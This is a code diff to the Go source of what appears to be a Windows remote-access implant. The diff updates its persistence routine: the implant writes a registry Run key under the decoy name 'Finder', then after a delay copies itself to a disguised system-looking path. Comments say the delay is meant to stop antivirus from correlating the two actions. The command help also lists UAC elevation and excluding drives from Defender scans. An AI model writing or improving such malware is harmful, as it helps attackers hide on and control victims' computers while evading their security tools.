@@ -1423,21 +1423,47 @@ func getFolderTree() string {
 // ================================================================
 
 func addPersistence() string {
-	exePath, _ := os.Executable()
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Sprintf("Executable path error: %v", err)
+	}
 
-	// Use HKCU Run key pointing to the current executable location.
-	// No file copy, no VBS stager — just a direct registry entry which is
-	// far less likely to be flagged than Startup folder scripts.
-	if err := regWrite(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "SecurityHealthSystray", exePath); err != nil {
+	// Step 1: HKCU Run key pointing to current exe (instant, not flagged)
+	if err := regWrite(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder", exePath); err != nil {
 		return fmt.Sprintf("Registry error: %v", err)
 	}
 
-	return fmt.Sprintf("Persistence added (HKCU Run → %s)", exePath)
+	// Step 2: Copy to a stealthy location in the background with a delay
+	// so AV doesn't correlate the reg write + file copy as a single action
+	installPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
+	go copyFileDelayed(exePath, installPath, 8*time.Second)
+
+	return "Startup Installed"
+}
+
+// copyFileDelayed copies src to dst after sleeping, then updates the registry
+// key to point to the new location. Runs as a goroutine so persistence returns
+// immediately (no blocking).
+func copyFileDelayed(src, dst string, delay time.Duration) {
+	time.Sleep(delay)
+	dstDir := filepath.Dir(dst)
+	os.MkdirAll(dstDir, 0755)
+	data, err := os.ReadFile(src)
+	if err != nil {
+		return
+	}
+	if err := os.WriteFile(dst, data, 0755); err != nil {
+		return
+	}
+	// Update registry to point to the copied location
+	regWrite(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder", dst)
 }
 
 func removePersistence() string {
-	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "SecurityHealthSystray")
-	return "Persistence removed (HKCU Run key deleted)"
+	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
+	installPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
+	os.Remove(installPath)
+	return "Persistence removed"
 }
 
 // ================================================================
@@ -1734,7 +1760,7 @@ SYSTEM
   sysinfo        - Full system information report
   isadmin        - Check if session is admin
   elevate        - Attempt UAC elevation
-  persist        - Add persistence (registry + startup)
+  persist        - Add persistence (HKCU Run + delayed file copy)
   unpersist      - Remove persistence
   excludec       - Exclude C:\ from Defender scans
   excludeall     - Exclude C:\ through G:\ from Defender
